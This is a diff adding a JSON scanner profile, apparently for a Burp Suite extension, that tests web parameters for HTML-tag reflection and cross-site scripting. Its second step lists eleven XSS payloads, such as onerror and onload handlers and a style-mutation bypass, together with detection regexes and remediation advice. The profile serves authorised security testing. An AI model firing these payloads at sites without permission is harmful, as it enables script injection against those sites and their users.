@@ -1,0 +1,99 @@
+[
+  {
+    "profile_name": "XSS_HTML_Tag_Context",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,<tag_xsstest1337>"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "param_body",
+          "user_provided",
+          "param_url"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Simple String,Not in Headers,<tag_xsstest1337>",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "none",
+        "issue_name": "HTML_Tag_Reflection",
+        "issue_severity": "Information",
+        "issue_confidence": "Firm",
+        "issue_detail": "Preliminary detection of HTML tag reflection without filtering",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      },
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,<img src=x onerror=alert(1)>",
+          "true,<svg onload=alert(1)>",
+          "true,<body onload=alert(1)>",
+          "true,<iframe onload=alert(1)>",
+          "true,<details open ontoggle=alert(1)>",
+          "true,<video src=1 onerror=alert(1)>",
+          "true,<div onpointerover=\"alert(1)\">xss</div>",
+          "true,<marquee loop=1 width=0 onfinish=alert(1)>",
+          "true,<isindex onmouseover=\"alert(1)\" prompt=xss>",
+          "true,<input autofocus onfocus=alert(1)>",
+          "true,<svg><p><style><a id=\"</style><img src=1 onerror=alert(1)>\">"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,<(img|svg|body|iframe|details|video|div|marquee|isindex|input)[^>]*?\\bon(error|load|toggle|pointerover|finish|mouseover|focus)\\s*=\\s*(['\"]?)alert\\(1\\)\\2[^>]*?>",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "always",
+        "issue_name": "HTML_Tag_XSS",
+        "issue_severity": "Medium",
+        "issue_confidence": "Certain",
+        "issue_detail": "User input can create new HTML tags without sanitization, allowing insertion of malicious scripts.",
+        "remediation_detail": "Implement whitelists for allowed values. Use HTML sanitization libraries like DOMPurify or completely escape user input with HTML encoding.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "XSS",
+      "HTML_Tag",
+      "All"
+    ]
+  }
+]
